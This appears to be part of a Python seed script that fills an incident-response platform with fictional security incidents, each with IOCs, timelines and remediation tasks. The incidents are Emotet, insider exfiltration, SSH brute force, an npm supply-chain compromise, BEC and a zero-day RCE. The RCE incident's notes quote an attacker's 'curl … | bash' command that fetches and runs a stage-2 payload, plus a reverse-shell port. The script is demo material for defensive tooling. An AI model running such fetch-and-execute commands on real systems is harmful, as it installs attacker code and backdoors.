    await add_ioc(client, token, iid, {"ioc_type": "domain", "value": "updates.windowsupd4te.com", "description": "Emotet C2/download server (typosquatted Windows update domain)", "confidence": 99, "status": "blocked", "tlp_level": "red"})
    await add_ioc(client, token, iid, {"ioc_type": "ip", "value": "91.108.4.235", "description": "Emotet C2 node #1", "confidence": 95, "status": "blocked", "tlp_level": "red", "tags": ["c2", "emotet"]})
    await add_ioc(client, token, iid, {"ioc_type": "ip", "value": "91.108.56.178", "description": "Emotet C2 node #2", "confidence": 92, "status": "blocked", "tlp_level": "red", "tags": ["c2", "emotet"]})
    await add_ioc(client, token, iid, {"ioc_type": "url", "value": "https://updates.windowsupd4te.com/update/kb4056892?v=2", "description": "Payload download URL from macro", "confidence": 100, "status": "blocked", "tlp_level": "red"})
    await add_ioc(client, token, iid, {"ioc_type": "email", "value": "careers@hiring-solutions247.biz", "description": "Email sender — Emotet spam botnet", "confidence": 88, "status": "blocked", "tlp_level": "amber"})

    for name, desc in [
        ("HR-WS-008", "Patient zero — HR Generalist who opened the maldoc"),
        ("HR-WS-009", "Infected via EternalBlue lateral movement"),
        ("HR-WS-011", "Infected via EternalBlue lateral movement"),
        ("HR-WS-014", "Infected via EternalBlue lateral movement"),
    ]:
        await add_asset(client, token, iid, {"asset_type": "workstation", "name": name, "description": desc, "status": "remediated", "criticality": "high"})

    await add_timeline(client, token, iid, {"entry_type": "detection", "occurred_at": dt(45, 10), "description": "CrowdStrike Falcon prevented macro execution and raised HIGH severity alert 'Malicious VBA Macro Execution Attempt'. Analyst reviewed alert and confirmed malicious activity.", "source": "crowdstrike"})
    await add_timeline(client, token, iid, {"entry_type": "analysis", "occurred_at": dt(45, 9), "description": "Macro succeeded on HR-WS-008 (CrowdStrike in monitoring mode only on that machine). Stage-2 download observed in DNS logs to updates.windowsupd4te.com.", "source": "manual"})
    await add_timeline(client, token, iid, {"entry_type": "evidence", "occurred_at": dt(45, 9), "description": "Maldoc preserved. Macro deobfuscated — confirmed Emotet document template injection. Stage-2 PE binary downloaded and executed as WindowsDefenderUpdate.exe.", "source": "manual", "is_pinned": True})
    await add_timeline(client, token, iid, {"entry_type": "containment", "occurred_at": dt(45, 8), "description": "HR subnet (10.0.5.0/24) isolated at switch level. All 4 infected workstations powered off after forensic memory acquisition.", "source": "manual"})
    await add_timeline(client, token, iid, {"entry_type": "analysis", "occurred_at": dt(44, 8), "description": "Memory analysis confirms Emotet E4 epoch variant. Credential harvesting module loaded — browser and Outlook credential stores accessed. Lateral movement attempted to HR file server (patching prevented success).", "source": "manual"})
    await add_timeline(client, token, iid, {"entry_type": "containment", "occurred_at": dt(44, 4), "description": "All 35 user accounts active on infected machines had passwords reset. Outlook credential stores purged and re-prompted on next login.", "source": "manual"})
    await add_timeline(client, token, iid, {"entry_type": "note", "occurred_at": dt(43, 0), "description": "All 4 workstations re-imaged from golden image. MS17-010 patch confirmed applied to all HR endpoints. GPO updated to block internet-sourced macro execution. Case closed.", "source": "manual"})

    for t in [
        await add_task(client, token, iid, {"title": "Re-image all 4 infected workstations", "priority": "critical"}),
        await add_task(client, token, iid, {"title": "Apply MS17-010 patch enterprise-wide", "priority": "critical"}),
        await add_task(client, token, iid, {"title": "Block macro execution via GPO for internet-sourced files", "priority": "high"}),
        await add_task(client, token, iid, {"title": "Reset credentials for all accounts on infected machines", "priority": "high"}),
    ]:
        await update_task(client, token, iid, t, {"status": "done"})

    await upload_attachment(client, token, iid, "emotet_memory_analysis.txt", fake_memory_dump_excerpt(), "text/plain")
    await upload_attachment(client, token, iid, "malware_sample_lab_only.txt", fake_malware_sample(), "text/plain")
    await upload_attachment(client, token, iid, "network_traffic_analysis.txt", fake_network_capture(), "text/plain")

    print(f"    ✅  INC-04 created (id={iid[:8]})")
    return iid


async def seed_incident_5(client, token):
    """Data Exfiltration via Dropbox (CLOSED, sev2, 14 days ago)"""
    print("  Creating INC-05: Data Exfiltration via Cloud Storage...")
    iid = await create_incident(client, token, {"title": "Unauthorised Data Exfiltration via Personal Dropbox Account", "severity": "sev2"})

    await patch_incident(client, token, iid, {
        "status": "closed",
        "executive_summary": "<p>DLP tooling detected a bulk export of ~850,000 customer records from the CRM database by a privileged user (John Williams, Engineering Manager) to a personal Dropbox account on February 28, 2025. The export occurred outside business hours. Investigation confirmed intentional insider data theft. The employee's access was revoked within 30 minutes of detection. Law enforcement has been engaged. Cyber insurance claim filed.</p>",
        "notes": "<p>Data classification: PII — customer names, addresses, phone numbers, partial payment card data (last 4 digits only, no full PAN). Approximately <strong>850,000</strong> unique customer records affected.</p><p>DLP rule triggered: 'Large CRM Export > 10,000 records outside business hours'. The employee used the internal reporting tool (Metabase) to export the full customers table.</p>",
        "lessons_learned": "<p>DLP rules should trigger at lower thresholds (5,000 records vs current 10,000) and during business hours too. Role-based access in Metabase should prevent individual contributors from running full-table exports. Privileged access reviews should be conducted quarterly.</p>",
        "actions_todo": '<ul data-type="taskList"><li data-checked="true"><p>Revoke all access for John Williams immediately</p></li><li data-checked="true"><p>Preserve all evidence for law enforcement</p></li><li data-checked="true"><p>Notify affected customers per GDPR/CCPA requirements</p></li><li data-checked="true"><p>Engage cyber insurance carrier</p></li><li data-checked="true"><p>File law enforcement report</p></li><li data-checked="true"><p>Lower DLP thresholds and implement row-level security in Metabase</p></li></ul>',
    })

    await add_ioc(client, token, iid, {"ioc_type": "url", "value": "https://www.dropbox.com/home/Personal/acme_customers_export.csv", "description": "Destination URL for exfiltrated data (Dropbox personal account)", "confidence": 100, "status": "blocked", "tlp_level": "red"})
    await add_ioc(client, token, iid, {"ioc_type": "ip", "value": "162.125.248.3", "description": "Dropbox upload server IP used during exfiltration event", "confidence": 95, "status": "active", "tlp_level": "green"})
    await add_ioc(client, token, iid, {"ioc_type": "username", "value": "john.williams@acmecorp.com", "description": "Insider threat actor — Engineering Manager", "confidence": 100, "status": "remediated", "tlp_level": "red"})
    await add_ioc(client, token, iid, {"ioc_type": "file", "value": "acme_customers_export_20250228.csv", "description": "Exported file containing 850,000 customer PII records", "confidence": 100, "status": "active", "tlp_level": "red"})

    await add_asset(client, token, iid, {"asset_type": "database", "name": "CRM Database (PostgreSQL prod-db-01)", "description": "Production CRM database — source of exfiltrated customer records", "status": "confirmed", "criticality": "critical"})
    await add_asset(client, token, iid, {"asset_type": "account", "name": "john.williams@acmecorp.com", "description": "Insider threat actor — access fully revoked", "status": "remediated", "criticality": "critical"})
    await add_asset(client, token, iid, {"asset_type": "cloud_resource", "name": "Dropbox (john.williams personal)", "description": "Unauthorised cloud storage used for exfiltration", "status": "confirmed", "criticality": "high"})
    await add_asset(client, token, iid, {"asset_type": "application", "name": "Metabase (internal BI tool)", "description": "Reporting tool used to execute the bulk export query", "status": "confirmed", "criticality": "high"})

    await add_timeline(client, token, iid, {"entry_type": "detection", "occurred_at": dt(14, 1), "description": "Nightfall DLP raised CRITICAL alert: 'Bulk PII export to cloud storage — 850,000 records'. Alert received at 00:23 UTC. On-call analyst paged.", "source": "nightfall-dlp"})
    await add_timeline(client, token, iid, {"entry_type": "containment", "occurred_at": dt(14, 0), "description": "john.williams AD account disabled, SSO sessions revoked, VPN certificate revoked. All access terminated within 30 minutes of detection.", "source": "manual"})
    await add_timeline(client, token, iid, {"entry_type": "evidence", "occurred_at": dt(13, 22), "description": "Metabase query log preserved showing exact SQL executed. Dropbox upload logs obtained via legal hold. Forensic image of user's work laptop (returned to office) acquired.", "source": "manual", "is_pinned": True})
    await add_timeline(client, token, iid, {"entry_type": "analysis", "occurred_at": dt(13, 20), "description": "Database audit log confirms 849,312 rows read from customers table at 23:49 UTC. No prior access outside business hours in past 6 months. User attempted to delete audit_log entries (failed — insufficient privilege).", "source": "manual"})
    await add_timeline(client, token, iid, {"entry_type": "comms", "occurred_at": dt(13, 18), "description": "General Counsel, CPO, and CEO notified. Decision to engage FBI (CISA notification required). Cyber insurance carrier (Chubb) notified. Mandatory breach notification assessment initiated.", "source": "manual", "is_pinned": True})
    await add_timeline(client, token, iid, {"entry_type": "note", "occurred_at": dt(11, 0), "description": "GDPR 72-hour notification submitted to ICO (UK). CCPA notification in progress. Customer notification letters being drafted with legal review.", "source": "manual"})

    for t in [
        await add_task(client, token, iid, {"title": "Revoke all access for John Williams", "priority": "critical"}),
        await add_task(client, token, iid, {"title": "Preserve forensic evidence chain of custody", "priority": "critical"}),
        await add_task(client, token, iid, {"title": "Submit GDPR/CCPA breach notifications", "priority": "critical"}),
        await add_task(client, token, iid, {"title": "File report with FBI IC3 and CISA", "priority": "high"}),
        await add_task(client, token, iid, {"title": "Implement row-level security in Metabase", "priority": "high"}),
        await add_task(client, token, iid, {"title": "Conduct privileged access audit across all internal tools", "priority": "medium"}),
    ]:
        await update_task(client, token, iid, t, {"status": "done"})

    await upload_attachment(client, token, iid, "dlp_alert_report.txt", fake_insider_report(), "text/plain")
    await upload_attachment(client, token, iid, "evidence_screenshot.png", base64.b64decode(TINY_PNG_B64), "image/png")

    print(f"    ✅  INC-05 created (id={iid[:8]})")
    return iid


async def seed_incident_6(client, token):
    """SSH Brute Force (CLOSED, sev3, 25 days ago)"""
    print("  Creating INC-06: SSH Brute Force Attack on DMZ Servers...")
    iid = await create_incident(client, token, {"title": "SSH Brute Force Attack on DMZ Web Servers — Successful Compromise", "severity": "sev3"})

    await patch_incident(client, token, iid, {
        "status": "closed",
        "executive_summary": "<p>On January 22, 2025, a sustained SSH brute force attack from IP 45.155.205.233 (Romania) successfully authenticated to DMZ web server dmz-web-01 using a weak password on the 'deploy' service account. The attacker gained root access via sudo. Evidence of reconnaissance only — no data accessed, no persistence established. All DMZ servers hardened. No further activity observed.</p>",
    })

    await add_ioc(client, token, iid, {"ioc_type": "ip", "value": "45.155.205.233", "description": "Attacker IP — 2,848 SSH auth attempts over 44 minutes, 1 success", "confidence": 100, "status": "blocked", "tlp_level": "green"})
    await add_ioc(client, token, iid, {"ioc_type": "username", "value": "deploy", "description": "Service account compromised via weak password ('deploy123')", "confidence": 100, "status": "remediated", "tlp_level": "green"})

    for name, desc in [
        ("dmz-web-01", "Compromised — deploy account brute forced (weak password 'deploy123')"),
        ("dmz-web-02", "Targeted but not compromised (strong password)"),
        ("dmz-web-03", "Targeted but not compromised (key-based auth only)"),
    ]:
        await add_asset(client, token, iid, {"asset_type": "server", "name": name, "description": desc, "status": "remediated" if name == "dmz-web-01" else "cleared", "criticality": "high"})

    await add_timeline(client, token, iid, {"entry_type": "detection", "occurred_at": dt(25, 21), "description": "Wazuh SIEM rule 'SSH Brute Force > 1000 attempts/hour' fired for dmz-web-01. Analyst confirmed ongoing brute force from single IP.", "source": "wazuh"})
    await add_timeline(client, token, iid, {"entry_type": "containment", "occurred_at": dt(25, 20), "description": "IP 45.155.205.233 blocked at perimeter firewall (pf rule). Checked auth logs — successful login had occurred 2 minutes earlier. Active session found and terminated.", "source": "manual", "is_pinned": True})
    await add_timeline(client, token, iid, {"entry_type": "analysis", "occurred_at": dt(25, 19), "description": "Bash history reviewed — attacker ran: id, uname -a, cat /etc/passwd, ps aux, netstat -tulnp. Reconnaissance only. No files modified, no crontabs added, no new users created.", "source": "manual"})
    await add_timeline(client, token, iid, {"entry_type": "note", "occurred_at": dt(24, 0), "description": "All DMZ servers: weak passwords removed, key-based auth enforced, root login disabled, fail2ban configured. Deploy account password rotated. Case closed.", "source": "manual"})

    for t in [
        await add_task(client, token, iid, {"title": "Block attacker IP at perimeter firewall", "priority": "high"}),
        await add_task(client, token, iid, {"title": "Reset deploy service account password", "priority": "high"}),
        await add_task(client, token, iid, {"title": "Enforce key-based SSH auth across all DMZ servers", "priority": "high"}),
        await add_task(client, token, iid, {"title": "Deploy fail2ban on all SSH-accessible servers", "priority": "medium"}),
    ]:
        await update_task(client, token, iid, t, {"status": "done"})

    await upload_attachment(client, token, iid, "ssh_auth_log_excerpt.txt", fake_ssh_log(), "text/plain")

    print(f"    ✅  INC-06 created (id={iid[:8]})")
    return iid


async def seed_incident_7(client, token):
    """Insider Threat — Database Access (MONITORING, sev2, 5 days ago)"""
    print("  Creating INC-07: Insider Threat — Unauthorised Database Access...")
    iid = await create_incident(client, token, {"title": "Potential Insider Threat — Engineer Accessing Sensitive Customer Database", "severity": "sev2"})

    await patch_incident(client, token, iid, {
        "status": "monitoring",
        "executive_summary": "<p>On March 8, 2025, anomaly detection flagged Senior Engineer Alex Turner running unusual SQL queries against the payments database outside of normal working hours. Queries accessed full payment records for ~12,000 customers. Investigation ongoing in conjunction with HR and Legal. Access has been reduced to read-only pending investigation outcome.</p>",
        "notes": "<p>Queries run: <code>SELECT * FROM payment_transactions WHERE amount > 10000</code> — 11,847 rows returned. No evidence of exfiltration yet (no unusual outbound traffic, no cloud uploads detected). User claims queries were for 'performance testing' but no approved test plan exists.</p>",
    })

    await add_ioc(client, token, iid, {"ioc_type": "username", "value": "alex.turner@acmecorp.com", "description": "Subject of investigation — Senior Engineer", "confidence": 70, "status": "active", "tlp_level": "red"})
    await add_ioc(client, token, iid, {"ioc_type": "file", "value": "payment_export_temp_20250308.csv", "description": "Temp file created during query execution — found on dev workstation", "confidence": 85, "status": "active", "tlp_level": "red"})

    await add_asset(client, token, iid, {"asset_type": "database", "name": "payments-db-prod-01", "description": "Production payments database — accessed outside working hours", "status": "suspected", "criticality": "critical"})
    await add_asset(client, token, iid, {"asset_type": "account", "name": "alex.turner@acmecorp.com", "description": "Under investigation — access reduced to read-only", "status": "suspected", "criticality": "high"})
    await add_asset(client, token, iid, {"asset_type": "workstation", "name": "DEV-WS-042", "description": "Alex Turner's workstation — forensic image pending", "status": "suspected", "criticality": "medium"})

    await add_timeline(client, token, iid, {"entry_type": "detection", "occurred_at": dt(5, 2), "description": "Datadog anomaly alert: 'Unusual query pattern — full table scan on payment_transactions at 23:47 UTC by alex.turner'. UEBA risk score: 87/100.", "source": "datadog"})
    await add_timeline(client, token, iid, {"entry_type": "analysis", "occurred_at": dt(5, 1), "description": "DB audit log reviewed. 3 queries executed in 25-minute window, returning 11,847 rows of payment data. Results saved to /tmp/payment_export_temp_20250308.csv on dev workstation.", "source": "manual"})
    await add_timeline(client, token, iid, {"entry_type": "containment", "occurred_at": dt(5, 0), "description": "alex.turner DB permissions downgraded to read-only. HR notified. Investigation officially opened. No outbound data transfer detected (DLP clear).", "source": "manual"})
    await add_timeline(client, token, iid, {"entry_type": "note", "occurred_at": dt(4, 16), "description": "User interview conducted with HR present. User claims queries were for performance profiling — unable to produce work order or manager approval. Investigation continues.", "source": "manual"})

    task1 = await add_task(client, token, iid, {"title": "Acquire forensic image of DEV-WS-042", "priority": "high", "phase": "analysis"})
    task2 = await add_task(client, token, iid, {"title": "Analyse workstation for evidence of data exfiltration tools", "priority": "high", "phase": "analysis"})
    task3 = await add_task(client, token, iid, {"title": "Review all of alex.turner's DB queries for past 90 days", "priority": "medium", "phase": "analysis"})
    task4 = await add_task(client, token, iid, {"title": "Check personal cloud storage services for outbound uploads", "priority": "high", "phase": "analysis"})

    await update_task(client, token, iid, task1, {"status": "in_progress"})
    await update_task(client, token, iid, task3, {"status": "in_progress"})

    await upload_attachment(client, token, iid, "investigation_report_draft.txt", fake_insider_report(), "text/plain")

    print(f"    ✅  INC-07 created (id={iid[:8]})")
    return iid


async def seed_incident_8(client, token):
    """Supply Chain Compromise (OPEN, sev1, 2 days ago — active)"""
    print("  Creating INC-08: Supply Chain Compromise — Build Pipeline...")
    iid = await create_incident(client, token, {"title": "Supply Chain Compromise Suspected — Malicious Code in CI/CD Build Pipeline", "severity": "sev1"})

    await patch_incident(client, token, iid, {
        "status": "open",
        "executive_summary": "<p><strong>ACTIVE INCIDENT — CRITICAL PRIORITY.</strong> On March 11, 2025, GitHub Advanced Security detected suspicious code changes in the company's internal npm package <code>@acme/core-utils</code>. The changes introduce a data-collection module that beacons to an external IP. The compromised package has been pulled from 3 production services. Full blast radius assessment in progress.</p>",
        "notes": "<p>Suspicious commit <code>a3f9c7d</code> added to @acme/core-utils by contributor account 'devops-automation-bot' at 02:14 UTC. This account's token was rotated last month following a phishing alert. Possible stolen OAuth token used.</p><p>3 production services already deployed the compromised version (v2.4.1). Version v2.4.0 confirmed clean. All three services are actively beaconing to 198.51.100.77.</p>",
    })

    await add_ioc(client, token, iid, {"ioc_type": "ip", "value": "198.51.100.77", "description": "Exfiltration endpoint — production services actively beaconing here", "confidence": 97, "status": "active", "tlp_level": "red", "tags": ["supply-chain", "active-c2"]})
    await add_ioc(client, token, iid, {"ioc_type": "domain", "value": "telemetry-cdn.io", "description": "C2 domain resolved by malicious npm module", "confidence": 95, "status": "active", "tlp_level": "red"})
    await add_ioc(client, token, iid, {"ioc_type": "hash", "value": "c0ffee1234567890abcdef1234567890abcdef1234567890abcdef1234567890", "description": "SHA256 — compromised @acme/core-utils v2.4.1 tarball", "confidence": 100, "status": "blocked", "tlp_level": "red"})
    await add_ioc(client, token, iid, {"ioc_type": "username", "value": "devops-automation-bot", "description": "Compromised GitHub service account used to push malicious code", "confidence": 90, "status": "remediated", "tlp_level": "red"})

    await add_asset(client, token, iid, {"asset_type": "application", "name": "@acme/core-utils v2.4.1", "description": "COMPROMISED npm package — removed from registry, all services rolling back", "status": "confirmed", "criticality": "critical"})
    await add_asset(client, token, iid, {"asset_type": "application", "name": "api-gateway (prod)", "description": "Deployed v2.4.1 of compromised package — actively beaconing", "status": "confirmed", "criticality": "critical"})
    await add_asset(client, token, iid, {"asset_type": "application", "name": "user-service (prod)", "description": "Deployed v2.4.1 of compromised package — actively beaconing", "status": "confirmed", "criticality": "critical"})
    await add_asset(client, token, iid, {"asset_type": "application", "name": "billing-service (prod)", "description": "Deployed v2.4.1 of compromised package — actively beaconing", "status": "confirmed", "criticality": "critical"})
    await add_asset(client, token, iid, {"asset_type": "cloud_resource", "name": "GitHub Actions Runners (prod-runner-pool)", "description": "CI/CD runners that built and published the compromised package", "status": "suspected", "criticality": "critical"})

    await add_timeline(client, token, iid, {"entry_type": "detection", "occurred_at": dt(2, 4), "description": "GitHub Advanced Security secret scanning alert: 'Anomalous code pattern detected in @acme/core-utils — potential data collection module added in commit a3f9c7d'. Security team paged immediately.", "source": "github-advanced-security", "is_pinned": True})
    await add_timeline(client, token, iid, {"entry_type": "analysis", "occurred_at": dt(2, 3), "description": "Manual code review of commit a3f9c7d confirms: base64-encoded payload that POSTs environment variables and process memory segments to 198.51.100.77 on module load.", "source": "manual"})
    await add_timeline(client, token, iid, {"entry_type": "containment", "occurred_at": dt(2, 3), "description": "v2.4.1 yanked from internal npm registry. devops-automation-bot GitHub tokens revoked. All GitHub Actions workflows paused pending investigation.", "source": "manual"})
    await add_timeline(client, token, iid, {"entry_type": "analysis", "occurred_at": dt(2, 2), "description": "Network logs confirm api-gateway, user-service, and billing-service deployed v2.4.1 within 4h of release. All three are beaconing to 198.51.100.77 every 60s. Rollback to v2.4.0 initiated.", "source": "manual", "is_pinned": True})
    await add_timeline(client, token, iid, {"entry_type": "note", "occurred_at": dt(1, 20), "description": "Rollback to v2.4.0 completed for all 3 services. Beaconing confirmed stopped. Blast radius assessment ongoing — determining what data was exfiltrated during 6-hour exposure window.", "source": "manual"})

    t1 = await add_task(client, token, iid, {"title": "Yank v2.4.1 from internal npm registry and rebuild all services with v2.4.0", "priority": "critical", "phase": "containment"})
    t2 = await add_task(client, token, iid, {"title": "Revoke all tokens for devops-automation-bot and audit all commits from that account", "priority": "critical", "phase": "containment"})
    t3 = await add_task(client, token, iid, {"title": "Determine full blast radius — what data was exfiltrated to 198.51.100.77", "priority": "critical", "phase": "analysis"})
    t4 = await add_task(client, token, iid, {"title": "Audit all CI/CD pipeline secrets and rotate any that were in scope", "priority": "critical", "phase": "analysis"})
    t5 = await add_task(client, token, iid, {"title": "Review all packages published in last 30 days for similar tampering", "priority": "high", "phase": "analysis"})
    t6 = await add_task(client, token, iid, {"title": "Implement mandatory code signing for all internal npm packages", "priority": "high", "phase": "remediation"})
    t7 = await add_task(client, token, iid, {"title": "Notify affected downstream customers if PII exfiltrated", "priority": "high", "phase": "remediation"})

    await update_task(client, token, iid, t1, {"status": "done"})
    await update_task(client, token, iid, t2, {"status": "done"})
    await update_task(client, token, iid, t3, {"status": "in_progress"})
    await update_task(client, token, iid, t4, {"status": "in_progress"})

    print(f"    ✅  INC-08 created (id={iid[:8]})")
    return iid


async def seed_incident_9(client, token):
    """Business Email Compromise (CLOSED, sev2, 60 days ago)"""
    print("  Creating INC-09: Business Email Compromise — Wire Transfer Attempt...")
    iid = await create_incident(client, token, {"title": "Business Email Compromise (BEC) — Fraudulent Wire Transfer Attempt", "severity": "sev2"})

    await patch_incident(client, token, iid, {
        "status": "closed",
        "executive_summary": "<p>On January 3, 2025, an attacker impersonating the CEO via a lookalike domain sent a wire transfer request to the CFO for $247,000. The CFO's EA forwarded the request to accounts payable before Finance caught the anomaly. The transfer was halted before execution. No financial loss occurred. The attacker used a spoofed email <code>ceo@acme-corp.net</code> (note hyphen) and referenced an accurate confidential acquisition deal, suggesting prior intelligence gathering.</p>",
        "notes": "<p>The attacker demonstrated prior knowledge of: the CEO's travel schedule, an upcoming confidential M&A deal ($47M acquisition of TechStartup), and the Finance team's wiring process. This suggests either a compromised email account, a disgruntled insider tip-off, or prior email account access.</p>",
        "lessons_learned": "<p>DMARC enforcement should have caught this — our domain has DMARC p=none (monitoring only). Upgrading to p=reject. Finance wire transfer policy now requires dual authorisation (CFO + COO) for any transfer over $25k, with a mandatory phone callback to the requester.</p>",
        "actions_todo": '<ul data-type="taskList"><li data-checked="true"><p>Update DMARC policy to p=reject</p></li><li data-checked="true"><p>Implement dual-authorisation for wire transfers > $25k</p></li><li data-checked="true"><p>Block lookalike domain at email gateway</p></li><li data-checked="true"><p>Investigate source of attacker intelligence (M&A deal knowledge)</p></li></ul>',
    })

    await add_ioc(client, token, iid, {"ioc_type": "email", "value": "ceo@acme-corp.net", "description": "BEC sender — lookalike domain (acme-corp.net vs acmecorp.com)", "confidence": 100, "status": "blocked", "tlp_level": "amber"})
    await add_ioc(client, token, iid, {"ioc_type": "domain", "value": "acme-corp.net", "description": "Attacker-registered lookalike domain (MX set to attacker mail server)", "confidence": 100, "status": "blocked", "tlp_level": "amber"})
    await add_ioc(client, token, iid, {"ioc_type": "ip", "value": "37.120.138.220", "description": "Mail server IP for acme-corp.net", "confidence": 95, "status": "blocked", "tlp_level": "amber"})

    await add_asset(client, token, iid, {"asset_type": "email_address", "name": "cfo@acmecorp.com", "description": "Target of BEC — CFO whose EA received the fraudulent email", "status": "cleared", "criticality": "high"})
    await add_asset(client, token, iid, {"asset_type": "email_address", "name": "ceo@acmecorp.com", "description": "Impersonated executive — actual CEO account reviewed, no compromise found", "status": "cleared", "criticality": "high"})

    await add_timeline(client, token, iid, {"entry_type": "detection", "occurred_at": dt(60, 14), "description": "AP Specialist noticed the sender domain was 'acme-corp.net' (not acmecorp.com) when about to process the $247,000 wire. Escalated to Finance Director. Incident opened.", "source": "manual", "is_pinned": True})
    await add_timeline(client, token, iid, {"entry_type": "containment", "occurred_at": dt(60, 13), "description": "Wire transfer halted — bank notified not to process. Email thread preserved. acme-corp.net domain blocked at email gateway.", "source": "manual"})
    await add_timeline(client, token, iid, {"entry_type": "analysis", "occurred_at": dt(60, 12), "description": "Analysis of BEC email: accurate references to CEO's travel to Singapore, correct name of acquisition target (TechStartup Inc.), and correct internal wiring instructions. Attacker had prior intelligence.", "source": "manual"})
    await add_timeline(client, token, iid, {"entry_type": "note", "occurred_at": dt(59, 0), "description": "Investigation into intelligence leak: CEO's travel posted on LinkedIn. M&A deal leaked via possible document access — legal engaged to assess M&A document distribution list. No email compromise found.", "source": "manual"})

    for t in [
        await add_task(client, token, iid, {"title": "Update DMARC to p=reject for acmecorp.com", "priority": "high"}),
        await add_task(client, token, iid, {"title": "Implement dual-auth wire transfer policy", "priority": "critical"}),
        await add_task(client, token, iid, {"title": "Review M&A document access logs for unauthorised access", "priority": "medium"}),
    ]:
        await update_task(client, token, iid, t, {"status": "done"})

    print(f"    ✅  INC-09 created (id={iid[:8]})")
    return iid


async def seed_incident_10(client, token):
    """Zero-Day RCE in Customer Portal (OPEN, sev1, yesterday — active)"""
    print("  Creating INC-10: Zero-Day RCE — Customer Portal...")
    iid = await create_incident(client, token, {"title": "Zero-Day Remote Code Execution in Customer Portal (PortalCMS CVE-2025-1337)", "severity": "sev1"})

    await patch_incident(client, token, iid, {
        "status": "open",
        "executive_summary": "<p><strong>ACTIVE INCIDENT — CRITICAL PRIORITY.</strong> On March 12, 2025, penetration testing firm BishopFox disclosed CVE-2025-1337, a critical unauthenticated RCE in PortalCMS 4.2.1 (our customer portal stack). Within 4 hours of disclosure, our WAF logs confirm active exploitation attempts. At 19:47 UTC, exploitation was confirmed successful — attacker achieved RCE as www-data. The portal has been taken offline. Customer data exposure assessment is in progress.</p>",
        "notes": "<p>CVE-2025-1337 exploits unsafe Java deserialization in the file upload handler. Payload is delivered via a crafted multipart POST to <code>/api/v1/upload</code>. Public PoC available on GitHub since 14:22 UTC. Our WAF rule was not blocking the exploit pattern.</p><p>Attacker achieved RCE at 19:47 UTC — 5 hours after CVE disclosure. Commands observed in web server logs: <code>id</code>, <code>cat /etc/passwd</code>, <code>curl http://198.51.100.99/stage2.sh | bash</code>. Stage 2 download indicates intent to establish persistence.</p>",
    })

    await add_ioc(client, token, iid, {"ioc_type": "ip", "value": "198.51.100.99", "description": "Attacker IP — source of exploit requests and stage-2 payload server", "confidence": 99, "status": "blocked", "tlp_level": "red", "tags": ["active-attacker", "rce"]})
    await add_ioc(client, token, iid, {"ioc_type": "url", "value": "http://198.51.100.99/stage2.sh", "description": "Stage-2 shell script download URL (post-exploitation persistence)", "confidence": 98, "status": "blocked", "tlp_level": "red"})
    await add_ioc(client, token, iid, {"ioc_type": "hash", "value": "deadbeef1234567890abcdef1234567890abcdef1234567890abcdef12345678", "description": "SHA256 — stage2.sh payload (reverse shell + cron persistence)", "confidence": 95, "status": "active", "tlp_level": "red"})
    await add_ioc(client, token, iid, {"ioc_type": "url", "value": "https://portal.acmecorp.com/api/v1/upload", "description": "Exploited endpoint — CVE-2025-1337 RCE vector (now offline)", "confidence": 100, "status": "blocked", "tlp_level": "red"})
    await add_ioc(client, token, iid, {"ioc_type": "ip", "value": "45.33.32.156", "description": "Second attacker IP — distinct source, same exploit, possible coordinated attack", "confidence": 80, "status": "blocked", "tlp_level": "red"})

    await add_asset(client, token, iid, {"asset_type": "server", "name": "portal-web-01 (prod)", "description": "COMPROMISED — Customer portal web server. Taken offline 20:15 UTC. Forensic image being acquired.", "status": "confirmed", "criticality": "critical", "tags": ["offline", "compromised"]})
    await add_asset(client, token, iid, {"asset_type": "server", "name": "portal-web-02 (prod)", "description": "Load balancer secondary — same vulnerable version. Taken offline as precaution.", "status": "confirmed", "criticality": "critical", "tags": ["offline"]})
    await add_asset(client, token, iid, {"asset_type": "database", "name": "portal-db-01 (postgres)", "description": "Customer portal database — RCE as www-data may allow DB access. Audit in progress.", "status": "suspected", "criticality": "critical"})
    await add_asset(client, token, iid, {"asset_type": "application", "name": "PortalCMS 4.2.1", "description": "Vulnerable application version — CVE-2025-1337. Patched version 4.2.2 available.", "status": "confirmed", "criticality": "critical"})
    await add_asset(client, token, iid, {"asset_type": "cloud_resource", "name": "AWS S3 portal-uploads bucket", "description": "S3 bucket for customer file uploads — accessible from www-data context. Contents audit required.", "status": "suspected", "criticality": "high"})

    await add_timeline(client, token, iid, {"entry_type": "detection", "occurred_at": dt(1, 6), "description": "BishopFox published CVE-2025-1337 advisory and PoC at 14:22 UTC. Vulnerability management team identified our portal as affected and raised P1 patch ticket.", "source": "vulnerability-management"})
    await add_timeline(client, token, iid, {"entry_type": "detection", "occurred_at": dt(1, 5), "description": "WAF (AWS WAF) started logging exploit pattern attempts at 16:03 UTC — 98 requests matching CVE-2025-1337 payload pattern from IP 198.51.100.99. WAF in monitoring mode — not blocking.", "source": "aws-waf"})
    await add_timeline(client, token, iid, {"entry_type": "detection", "occurred_at": dt(1, 4), "description": "Web server error log shows successful RCE at 19:47:32 UTC: POST /api/v1/upload → HTTP 200, followed by OS command output in access log. Pagerduty alert fired.", "source": "cloudwatch", "is_pinned": True})
    await add_timeline(client, token, iid, {"entry_type": "containment", "occurred_at": dt(1, 4), "description": "Portal taken offline (maintenance mode) at 20:15 UTC. Both portal-web-01 and portal-web-02 isolated. Emergency WAF rule deployed to block /api/v1/upload globally. 198.51.100.99 and 45.33.32.156 blocked at firewall.", "source": "manual"})
    await add_timeline(client, token, iid, {"entry_type": "evidence", "occurred_at": dt(1, 3), "description": "stage2.sh downloaded and analysed: installs cron reverse shell to 198.51.100.99:4444 every 5 minutes. Also attempts to dump /etc/shadow and portal application config files (DB credentials).", "source": "manual", "is_pinned": True})
    await add_timeline(client, token, iid, {"entry_type": "comms", "occurred_at": dt(1, 2), "description": "Status page updated: portal maintenance. CEO, Legal, and CTO notified. Cyber insurance carrier (Chubb) notified. Customer notification assessment started — determining if PII/data accessed.", "source": "manual"})
    await add_timeline(client, token, iid, {"entry_type": "analysis", "occurred_at": dt(0, 8), "description": "Forensic analysis of portal-web-01 in progress. Evidence of stage2.sh execution — cron job installed. DB password found in application config — portal-db-01 password rotated. S3 bucket key found — rotated. No evidence of DB dump yet.", "source": "manual"})

    t1 = await add_task(client, token, iid, {"title": "Take portal offline and isolate web servers", "priority": "critical", "phase": "containment"})
    t2 = await add_task(client, token, iid, {"title": "Deploy emergency WAF rule blocking CVE-2025-1337 exploit pattern", "priority": "critical", "phase": "containment"})
    t3 = await add_task(client, token, iid, {"title": "Rotate all credentials found in portal application config", "priority": "critical", "phase": "containment"})
